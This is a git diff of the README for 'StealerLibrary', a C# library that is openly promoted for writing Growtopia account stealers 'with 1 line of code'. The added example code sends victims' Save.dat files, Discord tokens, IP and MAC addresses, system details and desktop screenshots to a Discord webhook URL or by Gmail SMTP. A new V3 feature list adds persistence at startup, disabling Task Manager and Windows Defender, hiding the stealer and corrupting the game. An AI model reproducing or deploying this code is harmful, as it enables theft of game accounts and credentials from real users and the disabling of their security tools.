@@ -1,5 +1,6 @@
 # StealerLibrary
 Growtopia (Save.dat) Stealer Library that let you to write a stealer with 1 line of code.
+#### ⭐ If you like the project, feel free to star the project ⭐
 
 ## Compiled Version: [All Releases](https://github.com/extatent/StealerLibrary/releases/)
 
@@ -11,7 +12,6 @@ Growtopia (Save.dat) Stealer Library that let you to write a stealer with 1 line
 
 ```csharp
 using StealerLibrary;
-using System;
 
 namespace Example
 {
@@ -19,23 +19,32 @@ namespace Example
     {
         private static void Main()
         {
-            Growtopia.Stealer("https://discord.com/api/webhooks/837357864609199746/4wIlD35Q9QNdLGEfd9hWezQX9eAMxCBqDQcMmIBBvAtoKTjDlJAzkMaxyc1kcxaY4TpP", "Webhook Picture Url (Optional)", "Stealer Library", true, false, true, true, false, true, false, true, true);
+            //Discord Webhook Method
+            Library.DiscordWebhookUrl = "https://discord.com/api/webhooks/837357865609199646/4wIlD35Q9QNdLGEfh9hWeoQX9eAMxCBqDQcMmIBBvAtoFTjDlJAzkMaxyc1kcxaY4TpP";
+            Library.WebhookName = "StealerLibrary"; //Optional
+            Library.WebhookProfilePictureUrl = ""; //Optional
+            
+            //Last World, MAC Address, IP Address, Discord Token, User Name, Machine Name, OS Information, Country, Desktop Screenshot
+            Library.DiscordStealer(true, true, true, true, true, true, true, true, true);
+            
+            //Gmail Method
+            Library.Gmail = "example@gmail.com";
+            Library.GmailPassword = "Example12345.";
+            Library.SMTPServer = "smtp.gmail.com"; //Default
+            Library.SMTPPort = 587; //Default
+            
+            //Last World, MAC Address, IP Address, Discord Token, User Name, Machine Name, OS Information, Country, Desktop Screenshot
+            Library.GmailStealer(true, true, true, true, true, true, true, true, true);
+            
+            //Run On Startup, Disable Task Manager, Corrupt Growtopia, Hide Stealer, Disable Windows Defender
+            Library.Functions(true, false, true, false, false);
+            
+            //Trace Save.dat for Discord/Gmail
+            Library.TraceSaveDat(true, false);
         }
     }
 }
 ```
-1. Webhook Url
-2. Webhook Picture Url (Optional)
-3. Webhook Name (Optional)
-4. Last World (True/False)
-5. MAC Address (True/False)
-6. IP Address (True/False)
-7. Discord Token (True/False)
-8. User Name (True/False)
-9. Machine Name (True/False)
-10. OS Information (True/False)
-11. Country (True/False)
-12. Desktop Screenshot (True/False)
 
 ## Features
 ### V1
@@ -51,6 +60,14 @@ namespace Example
 - OS Information (Customizable: True/False)
 - Country (Customizable: True/False)
 - Desktop Screenshot (Customizable: True/False)
+### V3
+- Gmail Method (Customizable: True/False)
+- Trace Save.dat (Customizable: True/False)
+- Run On Startup (Customizable: True/False)
+- Disable Task Manager (Customizable: True/False)
+- Corrupt Growtopia (Customizable: True/False)
+- Hide Stealer (Customizable: True/False)
+- Disable Windows Defender (Customizable: True/False)
 
 <img src="http://anarchy.5v.pl/example2.png" alt="png">
 
